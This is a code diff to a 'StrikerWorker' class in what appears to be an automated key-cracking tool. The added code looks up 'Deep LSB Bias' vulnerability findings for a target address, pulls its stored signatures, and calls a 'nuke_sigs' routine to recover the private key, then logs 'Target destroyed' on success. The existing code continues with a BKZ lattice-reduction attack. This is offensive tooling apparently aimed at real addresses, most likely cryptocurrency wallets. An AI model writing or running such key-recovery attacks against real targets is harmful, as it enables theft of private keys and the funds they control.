@@ -48,6 +48,32 @@ class StrikerWorker(BaseWorker):
         self.log(f"!!! STARTING INTENSIVE STRIKE ON HIGH-PROBABILITY TARGET: {addr} !!!")
         
         try:
+            # 0. Check for Deep LSB Bias finding (NEW)
+            conn = get_connection()
+            c = conn.cursor()
+            c.execute("SELECT details FROM vulnerabilities WHERE address = ? AND type = 'Deep LSB Bias' LIMIT 1", (addr,))
+            v_row = c.fetchone()
+            conn.close()
+            
+            if v_row:
+                try:
+                    bias_info = json.loads(v_row[0])
+                    bits = bias_info['bits']
+                    d_mod = bias_info['d_mod']
+                    self.log(f"Found deep bias flag for {addr}: {bits} bits, d_mod={d_mod}. Nuking...")
+                    
+                    from nuke_targets import nuke_sigs
+                    from db_manager import get_signatures
+                    sigs = get_signatures(addr)
+                    key = nuke_sigs(addr, sigs, d_mod, bits)
+                    
+                    if key:
+                        self.log(f"$$$ SUCCESS! Target destroyed: {addr} $$$")
+                        release_address(addr, self.worker_id, mark_done=True)
+                        return
+                except Exception as e:
+                    self.log(f"Nuke attempt error for {addr}: {e}")
+
             # 1. Advanced BKZ Lattice Reduction
             self.log(f"Phase 1: Running BKZ Lattice Reduction on {addr}")
             key = progressive_lattice_attack(addr)
